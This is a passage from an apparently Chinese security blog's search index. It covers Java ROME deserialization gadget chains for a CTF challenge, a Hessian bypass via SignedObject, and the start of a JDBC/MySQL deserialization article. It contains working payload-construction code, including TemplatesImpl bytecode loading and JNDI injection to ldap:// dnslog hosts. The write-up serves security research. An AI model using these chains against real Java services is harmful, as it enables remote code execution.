); ByteArrayOutputStream bos = new ByteArrayOutputStream (); Hessian2Output hessianOutput = new Hessian2Output ( bos ); hessianOutput . writeObject ( table2 ); hessianOutput . getBytesOutputStream (). flush (); hessianOutput . completeMessage (); hessianOutput . close (); ByteArrayInputStream bis = new ByteArrayInputStream ( bos . toByteArray ()); Hessian2Input hessianInput = new Hessian2Input ( bis ); hessianInput . readObject (); } } \u53c2\u8003\u6587\u7ae0 # https://c014.cn/blog/java/ROME/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html https://xz.aliyun.com/t/10824","title":null},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BROME/#\u53cd\u5e8f\u5217\u5316\u7bc7\u4e4brome","text":"\u5728\u67d0\u6b21\u6bd4\u8d5b\u4e2d\u9047\u5230\u4e00\u4e2ajava\u7684\u53cd\u5e8f\u5217\u5316\u9898\uff0c\u9898\u76ee\u5f88\u76f4\u63a5\u5730\u7ed9\u4e86\u4e00\u4e2ajar\u5305\uff0cpom.xml\u91cc\u5b58\u5728ROME1.0\u7684\u4f9d\u8d56\uff0c\u540c\u65f6\u8fd8\u6709\u4e00\u4e2a\u975e\u5e38\u660e\u663e\u7684\u8def\u7531: \u5bf9body base64\u89e3\u7801\u540e\u53cd\u5e8f\u5217\u5316\uff0c\u4f46\u662f\u6709\u4e00\u4e2a\u9650\u5236\u662f\u8981\u6c42body\u7684\u957f\u5ea6\u8981\u5c0f\u4e8e1956\uff0c\u6240\u4ee5\u5c31\u6709\u4e86\u8fd9\u7bc7\u6587\u7ae0\u3002","title":"\u53cd\u5e8f\u5217\u5316\u7bc7\u4e4bROME"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BROME/#rome\u53cd\u5e8f\u5217\u5316\u94fe\u53ca\u5206\u6790","text":"\u6211\u4eec\u5148\u6765\u770b\u770b\u5927\u540d\u9f0e\u9f0e\u7684 ysoserial \u91cc\u7684ROME\u94fe\uff0c\u5176\u5229\u7528\u94fe\u5982\u4e0b: HashMap<K,V>.readObject(ObjectInputStream) HashMap<K,V>.hash(Object) == ObjectBean.hashCode() == EqualsBean.beanHashCode() ObjectBean.toString() == ToStringBean.toString() ToStringBean.toString(String) pReadMethod.invoke(_obj, NO_PARAMS) == TemplatesImpl.getOutputProperties() ... \u4e86\u89e3\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u94fe\uff0c\u4e3b\u8981\u662f\u5173\u6ce8\u5176\u7684source\uff0csink\u4ee5\u53ca\u5173\u952e\u8f6c\u6298\u70b9\uff0c\u8fd9\u6761\u94fe\u7684source\u662fHashMap\uff0csink\u662f TemplatesImpl.getOutputProperties() \u9020\u6210\u7684\u65b0\u7c7b\u521d\u59cb\u5316\u4ece\u800c\u6267\u884c\u65b0\u7c7bstatic\u4e2d\u7684\u6076\u610f\u4ee3\u7801\uff0c\u800c\u5173\u952e\u8f6c\u6298\u70b9\u4e3b\u8981\u662f pReadMethod.invoke(_obj,NO_PARAMS) \uff0c\u4e5f\u662fROME\u8fd9\u4e2a\u4f9d\u8d56\u6211\u4eec\u6700\u540e\u5229\u7528\u5230\u7684\u70b9\u3002 \u4f46\u662f\u5f88\u663e\u7136\u8fd9\u9053\u9898\u76ee\u6ca1\u529e\u6cd5\u76f4\u63a5\u7528\u8fd9\u6761\u94fe\u6253\u901a\uff0c\u539f\u56e0\u662f\u56e0\u4e3a\u8fd9\u4e2a\u94febase64\u4e4b\u540e\u592a\u957f\u4e86\uff0c\u5355\u7eaf\u6267\u884c\u4e00\u4e2awhoami\u7684\u957f\u5ea6\u957f\u8fbe4380: \u4e3a\u4e86\u7f29\u51cfpayload\u957f\u5ea6\uff0c\u8fd9\u91cc\u53c2\u8003\u4e86\u4e00\u4e0b \u7ec8\u6781Java\u53cd\u5e8f\u5217\u5316Payload\u7f29\u5c0f\u6280\u672f \uff0c\u4f46\u6700\u7ec8\u53d1\u73b0\u4e86\u5982\u679c\u4e0d\u4fee\u6539\u94fe\u7684\u8bdd\u662f\u6ca1\u529e\u6cd5\u8fbe\u5230\u9898\u76ee\u8981\u6c42\u7684\u957f\u5ea6\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u91cc\u9700\u8981\u53bb\u6316\u6398\u4e00\u6761\u65b0\u94fe:","title":"ROME\u53cd\u5e8f\u5217\u5316\u94fe\u53ca\u5206\u6790"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BROME/#\u65b0\u94fe1\u7b26\u5408\u9898\u76ee\u8981\u6c42","text":"\u9996\u5148\u6211\u4eec\u8981\u4e86\u89e3\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u4e0a\u6587\u7684payload\u5982\u6b64\u957f\uff0c\u5b9e\u9645\u4e0a\u6839\u636e\u8c03\u7528\u94fe\u6211\u4eec\u4e0d\u96be\u53d1\u73b0ObjectBean\u662f\u7f6a\u9b41\u7978\u9996\uff0c\u5176\u5728\u5b9e\u4f8b\u5316\u65f6\u4f1a\u5b9e\u4f8b\u5316\u4e09\u4e2abean\uff0c\u8fd9\u80fd\u4e0d\u5927\u5417: \u4f46\u662fObjectBean\u5b9e\u9645\u4e0a\u662f\u4e0a\u6587\u94fe\u7684\u6838\u5fc3\u5173\u952e: ObjectBean.hashCode() => ObjectBean._equalsBean.beanHashCode() => ObjectBean._toStringBean.toString() \u3002\u5982\u679c\u6211\u4eec\u60f3\u8981\u629b\u5f03ObjectBean\u7684\u8bdd\uff0c\u6211\u4eec\u6ca1\u529e\u6cd5\u901a\u8fc7 HashMap \u89e6\u53d1 ToStringBean.toString() \u3002 \u4e0a\u9762\u6211\u4eec\u5206\u6790\u5230ROME\u94fe\u7684\u5173\u952e\u8f6c\u6298\u70b9\u662f pReadMethod.invoke(_obj,NO_PARAMS) \u8fd9\u6bb5\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7IDEA\u53bb\u641c\u7d22\u4e00\u4e0b\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e0d\u6b62ToStringBean\u5b58\u5728\u8fd9\u4e2a\u5229\u7528\u70b9\uff0c\u5176\u4ed6Bean\u4e5f\u5b58\u5728: \u6839\u636e\u622a\u56fe\u6211\u4eec\u53ef\u4ee5\u770b\u5230 EqualsBean \u4e5f\u5b58\u5728\u8fd9\u4e2a\u5173\u952e\u4ee3\u7801\uff0c\u53ef\u4ee5\u770b\u5230\u5f53\u8c03\u7528 EqualsBean.equals() \u65f6\u6700\u7ec8\u4f1a\u8c03\u7528\u5230 EqualsBean.beanEquals() \uff0c\u89e6\u53d1\u6211\u4eec\u7684\u5173\u952e\u4ee3\u7801: public boolean equals ( Object obj ) { return beanEquals ( obj ); } public boolean beanEquals ( Object obj ) { Object bean1 = _obj ; Object bean2 = obj ; boolean eq ; if ( bean2 == null ) { eq = false ; } else if ( bean1 == null && bean2 == null ) { eq = true ; } else if ( bean1 == null || bean2 == null ) { eq = false ; } else { if ( ! _beanClass . isInstance ( bean2 )) { eq = false ; } else { eq = true ; try { PropertyDescriptor [] pds = BeanIntrospector . getPropertyDescriptors ( _beanClass ); if ( pds != null ) { for ( int i = 0 ; eq && i < pds . length ; i ++ ) { Method pReadMethod = pds [ i ] . getReadMethod (); if ( pReadMethod != null && // ensure it has a getter method pReadMethod . getDeclaringClass () != Object . class && // filter Object.class getter methods pReadMethod . getParameterTypes (). length == 0 ) { // filter getter methods that take parameters Object value1 = pReadMethod . invoke ( bean1 , NO_PARAMS ); Object value2 = pReadMethod . invoke ( bean2 , NO_PARAMS ); eq = doEquals ( value1 , value2 ); } } } } catch ( Exception ex ) { throw new RuntimeException ( \"Could not execute equals()\" , ex ); } } } return eq ; } \u5982\u679c\u6211\u4eec\u6709\u8fc7\u8c03\u8bd5\u548c\u6784\u9020CC7\u94fe\u7684\u7ecf\u9a8c\u7684\u8bdd\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u60f3\u5230\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528Hashtable\u6765\u4f5c\u4e3asource\uff0c\u89e6\u53d1equals\u65b9\u6cd5: \u63a5\u4e0b\u6765\u5c31\u662f\u6839\u636eCC7\u548cROME\u94fe\u8fdb\u884c\u6539\u9020\uff0c\u6700\u7ec8\u5f97\u5230\u5982\u4e0b\u7684payload(\u6269\u5c55\u4e8e EmYiQing/ShortPayload ): package org.sec.payload ; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ; import com.sun.syndication.feed.impl.EqualsBean ; import javax.xml.transform.Templates ; import java.util.HashMap ; import java.util.Hashtable ; public class ROME extends Payload { @SuppressWarnings ( \"all\" ) public static byte [] getPayloadUseByteCodes ( byte [] byteCodes ) { try { TemplatesImpl templates = new TemplatesImpl (); setFieldValue ( templates , \"_bytecodes\" , new byte [][] { byteCodes }); setFieldValue ( templates , \"_name\" , \"t\" ); EqualsBean bean = new EqualsBean ( String . class , \"s\" ); HashMap map1 = new HashMap (); HashMap map2 = new HashMap (); map1 . put ( \"yy\" , bean ); map1 . put ( \"zZ\" , templates ); map2 . put ( \"zZ\" , bean ); map2 . put ( \"yy\" , templates ); Hashtable table = new Hashtable (); table . put ( map1 , \"1\" ); table . put ( map2 , \"2\" ); setFieldValue ( bean , \"_beanClass\" , Templates . class ); setFieldValue ( bean , \"_obj\" , templates ); return serialize ( table ); } catch ( Exception e ) { e . printStackTrace (); } return new byte [] {}; } } \u8ba9\u6211\u4eec\u6765\u5b9e\u9645\u6d4b\u8bd5\u4e00\u4e0b\u957f\u5ea6: \u6700\u7ec8base64\u4e4b\u540e\u7684payload\u957f\u5ea6\u53ea\u67091452\uff0c\u5b8c\u7f8e\u7b26\u5408\u6211\u4eec\u7684\u9884\u671f:","title":"\u65b0\u94fe1(\u7b26\u5408\u9898\u76ee\u8981\u6c42)"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BROME/#\u5229\u7528\u94fe","text":"Hashtable.readObject() Hashtable.reconstitutionPut() EqualsBean.equals(TemplatesImpl) EqualsBean.beanEquals(TemplatesImpl) pReadMethod.invoke(_obj, NO_PARAMS) == TemplatesImpl.getOutputProperties() ...","title":"\u5229\u7528\u94fe"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BROME/#\u65b0\u94fe2\u4e0d\u7b26\u5408\u9898\u76ee\u8981\u6c42","text":"\u5b9e\u9645\u4e0a\u6211\u4eec\u77e5\u9053 pReadMethod.invoke(_obj,NO_PARAMS) \u6700\u7ec8\u4f1a\u8c03\u7528\u5230_obj\u7684\u6240\u6709getter\u65b9\u6cd5\uff0c\u6839\u636e\u6211\u4eec\u5bf9\u53cd\u5e8f\u5217\u5316\u94fe\u7684\u4e86\u89e3\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5229\u7528 JdbcRowSetImpl.getDatabaseMetaData() \u65b9\u6cd5\u6700\u7ec8\u89e6\u53d1JNDI\u6ce8\u5165\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5c06sink\u4fee\u6539\u4e00\u4e0b\u5373\u53ef: package top.longlone ; import com.sun.rowset.JdbcRowSetImpl ; import com.sun.syndication.feed.impl.EqualsBean ; import sun.misc.BASE64Encoder ; import java.io.ByteArrayOutputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.HashMap ; import java.util.Hashtable ; public class ROME { public static void setFieldValue ( Object object , String fieldName , Object value ) { try { Field field = object . getClass (). getDeclaredField ( fieldName ); field . setAccessible ( true ); field . set ( object , value ); } catch ( Exception e ) { e . printStackTrace (); } } public static void main ( String [] args ) throws Exception { JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl (); jdbcRowSet . setDataSourceName ( \"ldap://exmaple.dnslog.cn/a\" ); jdbcRowSet . setMatchColumn ( new String [] { \"a\" }); EqualsBean bean = new EqualsBean ( String . class , \"s\" ); HashMap map1 = new HashMap (); HashMap map2 = new HashMap (); map1 . put ( \"yy\" , bean ); map1 . put ( \"zZ\" , jdbcRowSet ); map2 . put ( \"zZ\" , bean ); map2 . put ( \"yy\" , jdbcRowSet ); Hashtable table = new Hashtable (); table . put ( map1 , \"1\" ); table . put ( map2 , \"2\" ); setFieldValue ( bean , \"_beanClass\" , JdbcRowSetImpl . class ); setFieldValue ( bean , \"_obj\" , jdbcRowSet ); ByteArrayOutputStream baos = new ByteArrayOutputStream (); ObjectOutputStream objectOutputStream = new ObjectOutputStream ( baos ); objectOutputStream . writeObject ( table ); String b64data = new BASE64Encoder (). encode ( baos . toByteArray ()); System . out . println ( b64data . length ()); // \u53cd\u5e8f\u5217\u5316 // ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray())); // ois.readObject(); } } \u4f46\u662f\u5f53\u6211\u4eec\u8fd0\u884c\u7a0b\u5e8f\u65f6\u5f88\u9057\u61be\u5730\u53d1\u73b0\u957f\u5ea6\u8fd8\u662f\u8d85\u51fa\u4e861956: \u65b0\u94fe2\u957f\u5ea6\u5f88\u5927\u7684\u539f\u56e0\u662f\u56e0\u4e3a JdbcRowSetImpl \u8fd9\u4e2a\u7c7b\u7684\u5bf9\u8c61\u592a\u5927\u4e86\uff0c\u65b9\u6cd5\u5de8\u591a\uff0c\u672c\u6765\u4f18\u5316\u7684\u601d\u8def\u662f\u7528ASM\u628a\u6ca1\u7528\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u5168\u90e8\u626c\u4e86\uff0c\u4f46\u662f\u8fd9\u4e2a\u7c7b\u7684\u7c7b\u52a0\u8f7d\u5668\u662f BootStrap \uff0c\u4f4d\u4e8e\u53cc\u4eb2\u59d4\u6d3e\u7684\u6700\u9876\u5c42\uff0c\u6240\u4ee5\u4fee\u6539\u8fc7\u540e\u7684\u5b57\u8282\u7801\u6ca1\u529e\u6cd5\u518d\u6b21\u52a0\u8f7d\u3002 \u53e6\u4e00\u4e2a\u4f18\u5316\u601d\u8def\u662f\u628a\u6ca1\u7528\u7684\u5c5e\u6027\u5168\u90e8\u6539\u4e3anull\uff0c\u4f46\u662f\u8981\u6ce8\u610f\u4e0d\u80fd\u5f71\u54cdsink\u7684\u6700\u7ec8\u6267\u884c\u7ed3\u679c\uff0c\u6240\u4ee5\u8fd9\u91cc\u8981\u5bf9\u7167 pds[] \u4e2d getter \u65b9\u6cd5\u7684\u987a\u5e8f\u9009\u62e9\u5bf9\u5e94\u7684\u5c5e\u6027\u8fdb\u884c\u4fee\u6539\uff1a public class ROME_JNDI { public static void main ( String [] args ) throws Exception { JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl (); jdbcRowSet . setDataSourceName ( \"ldap://1tqzc9.dnslog.cn/\" ); jdbcRowSet . setMatchColumn ( \"a\" ); clear ( jdbcRowSet ); EqualsBean equalsBean = new EqualsBean ( String . class , \"\" ); HashMap < String , Object > innerMap1 = new HashMap <> (); innerMap1 . put ( \"zZ\" , equalsBean ); innerMap1 . put ( \"yy\" , jdbcRowSet ); HashMap < String , Object > innerMap2 = new HashMap <> (); innerMap2 . put ( \"zZ\" , jdbcRowSet ); innerMap2 . put ( \"yy\" , equalsBean ); Hashtable table = new Hashtable (); table . put ( innerMap1 , 1 ); table . put ( innerMap2 , 1 ); Utils . setFieldValue ( equalsBean , \"_beanClass\" , JdbcRowSetImpl . class ); Utils . setFieldValue ( equalsBean , \"_obj\" , jdbcRowSet ); System . out . println ( new BASE64Encoder (). encode ( Utils . serialize ( table )). length ()); Utils . unserialize ( Utils . serialize ( table )); } static void clear ( JdbcRowSetImpl jdbcRowSet ) throws Exception { Utils . setFieldValue ( jdbcRowSet , \"iMatchColumns\" , null ); Utils . setFieldValue ( jdbcRowSet , \"resBundle\" , null ); Class <?> clazz = Class . forName ( BaseRowSet . class . getName ()); Field fee = clazz . getDeclaredField ( \"listeners\" ); fee . setAccessible ( true ); fee . set ( jdbcRowSet , null ); fee = clazz . getDeclaredField ( \"params\" ); fee . setAccessible ( true ); fee . set ( jdbcRowSet , null ); } } \u6700\u540e\u957f\u5ea6\u4e3a\uff1a","title":"\u65b0\u94fe2(\u4e0d\u7b26\u5408\u9898\u76ee\u8981\u6c42)"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BROME/#\u4e8c\u6b21\u53cd\u5e8f\u5217\u5316\u7ed5\u8fc7\u65b9\u5f0f","text":"\u6709\u65f6\u5019\u6211\u4eec\u4f1a\u9047\u5230\u4e00\u4e9b\u5176\u4ed6\u7684\u53cd\u5e8f\u5217\u5316\u65b9\u5f0f\uff0c\u4f8b\u5982Hessian(2)\uff0c\u5982\u679c\u4f7f\u7528\u8fd9\u79cd\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u7684\u8bdd\uff0c\u6211\u4eec\u7684\u94fe\u53ef\u80fd\u4f1a\u51fa\u73b0\u95ee\u9898\uff0c\u539f\u56e0\u662f\u6211\u4eec\u7684Sink\u4e0d\u80fd\u518d\u4f7f\u7528TemplatesImpl\u7c7b\uff0c\u539f\u56e0\u662f: \u8fd9\u79cd\u53cd\u5e8f\u5217\u5316\u4e0d\u4f1a\u89e6\u53d1 TemplatesImpl.readObject() \u65b9\u6cd5\uff0c\u5bfc\u81f4\u53cd\u5e8f\u5217\u5316\u51fa\u6765\u7684 TemplatesImpl._tfactory \u5c5e\u6027\u4e3a\u7a7a(\u8fd9\u4e2a\u5c5e\u6027\u5b58\u5728transient\u5173\u952e\u5b57\u4fee\u9970\uff0c\u65e0\u6cd5\u5e8f\u5217\u5316)\uff0c\u8fd9\u6837\u5bfc\u81f4\u6211\u4eec\u6700\u540e\u6ca1\u529e\u6cd5\u5229\u7528 TemplatesImpl#defineTransletClasses \u65b9\u6cd5\u53bb\u5b9e\u73b0\u4efb\u610fjava\u4ee3\u7801\u6267\u884c\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5b9e\u9645\u4e0a\u6211\u4eec\u5c31\u53ea\u5269\u4e0bJNDI\u8fd9\u4e00\u6761\u8def\uff0c\u4f46\u52a0\u5165\u76ee\u6807\u4e0d\u51fa\u7f51/JDK\u7248\u672c\u8fc7\u9ad8\u7684\u8bdd\uff0cJNDI\u662f\u4e0d\u597d\u7528\u7684\uff0c\u8fd8\u6709\u5176\u4ed6\u65b9\u6cd5\u5417\uff1f \u7b54\u6848\u662f\u4e8c\u6b21\u53cd\u5e8f\u5217\u5316\uff0c\u6211\u4eec\u77e5\u9053EqualsBean/ToStringBean\u8fd9\u51e0\u4e2a\u7c7b\u6700\u7ec8\u4f1a\u89e6\u53d1\u67d0\u4e2a\u7c7b\u7684\u6240\u6709getter\uff0c\u90a3\u4e48\u5047\u5982\u5b58\u5728\u4e00\u4e2a\u7c7b\u5176getter\u65b9\u6cd5\u53c8\u4f1a\u4f7f\u7528java\u539f\u751f\u53cd\u5e8f\u5217\u5316\uff0c\u800c\u4e14\u5176\u53cd\u5e8f\u5217\u5316\u5185\u5bb9\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u884c\u7ed5\u8fc7\u4e86\uff0c\u8fd9\u4e2a\u7c7b\u6b63\u662f java.security.SignedObject : \u90a3\u4e48\u6211\u4eec\u53bb\u627e\u4e0b\u8fd9\u4e2a\u7c7b\u7684\u7528\u6cd5\uff0c\u5176\u6784\u9020\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f1a\u88ab\u5e8f\u5217\u5316\u7136\u540e\u5b58\u653e\u5230 SignedObject.content \u4e2d: KeyPairGenerator kpg = KeyPairGenerator . getInstance ( \"DSA\" ); kpg . initialize ( 1024 ); KeyPair kp = kpg . generateKeyPair (); SignedObject signedObject = new SignedObject ( \"secret\" , kp . getPrivate (), Signature . getInstance ( \"DSA\" )); \u901a\u8fc7\u4f7f\u7528\u8fd9\u4e2a\u7c7b\uff0c\u6211\u4eec\u53ef\u4ee5\u6700\u7ec8\u6784\u9020\u51fa\u4e8c\u6b21\u53cd\u5e8f\u5217\u5316\u7684payload: public class ROMETools { public static Hashtable getPayload ( Class clazz , Object payloadObj ) { EqualsBean bean = new EqualsBean ( String . class , \"s\" ); HashMap map1 = new HashMap (); HashMap map2 = new HashMap (); map1 . put ( \"yy\" , bean ); map1 . put ( \"zZ\" , payloadObj ); map2 . put ( \"zZ\" , bean ); map2 . put ( \"yy\" , payloadObj ); Hashtable table = new Hashtable (); table . put ( map1 , \"1\" ); table . put ( map2 , \"2\" ); Utils . setFieldValue ( bean , \"beanClass\" , clazz ); Utils . setFieldValue ( bean , \"obj\" , payloadObj ); return table ; } public static void main ( String [] args ) throws Exception { TemplatesImpl templates = new TemplatesImpl (); ClassPool pool = ClassPool . getDefault (); CtClass clazz = pool . getCtClass ( \"top.longlone.A\" ); byte [] bytes = clazz . toBytecode (); Utils . setFieldValue ( templates , \"_bytecodes\" , new byte [][] { bytes }); Utils . setFieldValue ( templates , \"_name\" , \"A\" ); Hashtable table1 = getPayload ( Templates . class , templates ); KeyPairGenerator kpg = KeyPairGenerator . getInstance ( \"DSA\" ); kpg . initialize ( 1024 ); KeyPair kp = kpg . generateKeyPair (); SignedObject signedObject = new SignedObject ( table1 , kp . getPrivate (), Signature . getInstance ( \"DSA\" )); Hashtable table2 = getPayload ( SignedObject . class , signedObject ); ByteArrayOutputStream bos = new ByteArrayOutputStream (); Hessian2Output hessianOutput = new Hessian2Output ( bos ); hessianOutput . writeObject ( table2 ); hessianOutput . getBytesOutputStream (). flush (); hessianOutput . completeMessage (); hessianOutput . close (); ByteArrayInputStream bis = new ByteArrayInputStream ( bos . toByteArray ()); Hessian2Input hessianInput = new Hessian2Input ( bis ); hessianInput . readObject (); } }","title":"\u4e8c\u6b21\u53cd\u5e8f\u5217\u5316\u7ed5\u8fc7\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BROME/#\u53c2\u8003\u6587\u7ae0","text":"https://c014.cn/blog/java/ROME/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html https://xz.aliyun.com/t/10824","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%BC%80%E5%A4%B4%E5%A3%B0%E6%98%8E/","tags":["java","java\u5b89\u5168","\u53cd\u5e8f\u5217\u5316"],"text":"\u5f00\u5934\u58f0\u660e # \u8fd9\u4e2a\u5206\u7c7b\u4e0b\u7684\u6587\u7ae0\u5747\u6765\u81ea\u6211\u9605\u8bfbp\u725b\u7684 java\u5b89\u5168\u6f2b\u8c08 \u540e\u7684\u590d\u73b0\u4e0e\u4e2a\u4eba\u7684\u53cd\u5e8f\u5217\u5316\u7814\u7a76\uff0c\u4fb5\u5220\u3002","title":"\u5f00\u5934\u58f0\u660e"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%BC%80%E5%A4%B4%E5%A3%B0%E6%98%8E/#\u5f00\u5934\u58f0\u660e","text":"\u8fd9\u4e2a\u5206\u7c7b\u4e0b\u7684\u6587\u7ae0\u5747\u6765\u81ea\u6211\u9605\u8bfbp\u725b\u7684 java\u5b89\u5168\u6f2b\u8c08 \u540e\u7684\u590d\u73b0\u4e0e\u4e2a\u4eba\u7684\u53cd\u5e8f\u5217\u5316\u7814\u7a76\uff0c\u4fb5\u5220\u3002","title":"\u5f00\u5934\u58f0\u660e"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JDBC/","tags":["java","java\u5b89\u5168"],"text":"JDBC # \u4ec0\u4e48\u662fJDBC # JDBC\u4e00\u822c\u6307Java\u6570\u636e\u5e93\u8fde\u63a5\u3002Java\u6570\u636e\u5e93\u8fde\u63a5\uff0c\uff08Java Data Base Connectivity\uff0c\u7b80\u79f0JDBC\uff09 \u662f\u4e00\u79cd\u7528\u4e8e\u6267\u884cSQL\u8bed\u53e5\u7684Java API\uff0c\u53ef\u4ee5\u4e3a\u591a\u79cd\u5173\u7cfb\u6570\u636e\u5e93\u63d0\u4f9b\u7edf\u4e00\u8bbf\u95ee\uff0c\u5b83\u7531\u4e00\u7ec4\u7528Java\u8bed\u8a00\u7f16\u5199\u7684\u7c7b\u548c\u63a5\u53e3\u7ec4\u6210\u3002JDBC\u63d0\u4f9b\u4e86\u4e00\u79cd\u57fa\u51c6\uff0c\u636e\u6b64\u53ef\u4ee5\u6784\u5efa\u66f4\u9ad8\u7ea7\u7684\u5de5\u5177\u548c\u63a5\u53e3\uff0c\u4f7f\u6570\u636e\u5e93\u5f00\u53d1\u4eba\u5458\u80fd\u591f\u7f16\u5199\u6570\u636e\u5e93\u5e94\u7528\u7a0b\u5e8f\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u793a\u4f8b\u5982\u4e0b: import java.sql.* ; public class Test { public static void main ( String [] args ) throws ClassNotFoundException , SQLException { String Driver = \"com.mysql.cj.jdbc.Driver\" ; String DB_URL = \"jdbc:mysql://127.0.0.1:3306/test?serverTimezone=UTC\" ; Class . forName ( Driver ); // \u8fde\u63a5\u6570\u636e\u5e93 Connection conn = DriverManager . getConnection ( DB_URL , \"root\" , \"root\" ); // \u64cd\u4f5c\u6570\u636e\u5e93 Statement stmt = conn . createStatement (); ResultSet rs = stmt . executeQuery ( \"SELECT * FROM users\" ); while ( rs . next ()) { System . out . println ( rs . getString ( \"username\" ) + \" : \" + rs . getString ( \"password\" )); } } } JDBC\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7b80\u4ecb # \u5982\u679c\u653b\u51fb\u8005\u80fd\u591f\u63a7\u5236JDBC\u8fde\u63a5\u8bbe\u7f6e\u9879(\u5373\u4e0a\u9762\u793a\u4f8b\u4e2d\u7684 DB_URL )\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u5176\u6307\u5411\u6076\u610fMySQL\u670d\u52a1\u5668\u8fdb\u884cObjectInputStream.readObject()\u7684\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u4ece\u800cRCE\u3002 \u5177\u4f53\u70b9\u8bf4\uff0c\u5c31\u662f\u901a\u8fc7JDBC\u8fde\u63a5MySQL\u670d\u52a1\u7aef\u65f6\uff0c\u4f1a\u6709\u51e0\u4e2a\u5185\u7f6e\u7684SQL\u67e5\u8be2\u8bed\u53e5\u8981\u6267\u884c\uff0c\u5176\u4e2d\u4e24\u4e2a\u67e5\u8be2\u7684\u7ed3\u679c\u96c6\u5728MySQL\u5ba2\u6237\u7aef\u88ab\u5904\u7406\u65f6\u4f1a\u8c03\u7528ObjectInputStream.readObject()\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\u3002 \u53ef\u88ab\u5229\u7528\u7684\u4e24\u6761\u67e5\u8be2\u8bed\u53e5\uff1a - SHOW SESSION STATUS - SHOW COLLATION JDBC\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790 # \u53cd\u5e8f\u5217\u5316\u70b9( readObject() )\u5728 com.mysql.cj.jdbc.result.ResultSetImpl \u7684 public Object getObject(int columnIndex) \u7684 switch \u6761\u4ef6\u8bed\u53e5\u4e2d\uff0c\u5b58\u5728\u4e24\u5904\u53cd\u5e8f\u5217\u5316\u70b9\uff0c\u4e00\u5904\u662f case BIT \uff0c\u53e6\u4e00\u5904\u662f case BLOB : \u90a3\u4e48\u6211\u4eec\u5c31\u9700\u8981\u4e86\u89e3\u4e00\u4e0b getObject() \u65b9\u6cd5\u7684\u4f5c\u7528\uff0c\u53c2\u8003 jdbc\u7684\u6587\u6863 ResultSet.getObject() \u65b9\u6cd5\u662f\u7528\u4e8eMySQL\u548cJava\u7c7b\u578b\u4e4b\u95f4\u7684\u7c7b\u578b\u8f6c\u6362 \u800c\u5176\u4e2d BIT \u548c BLOB \u5c31\u662fMySQL\u91cc\u7684\u4e00\u79cd\u6570\u636e\u683c\u5f0f\uff0c\u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u6211\u4eec\u6570\u636e\u4e2d\u8fd4\u56de\u4e86 BIT \u6216\u8005 BLOB \u7c7b\u578b\u7684\u6570\u636e\uff0cjdbc\u4f1a\u5c1d\u8bd5\u5c06\u5176\u53cd\u5e8f\u5217\u5316\u4e3ajava\u5bf9\u8c61\uff0c\u8fd9\u91cc\u5c31\u53ef\u80fd\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002 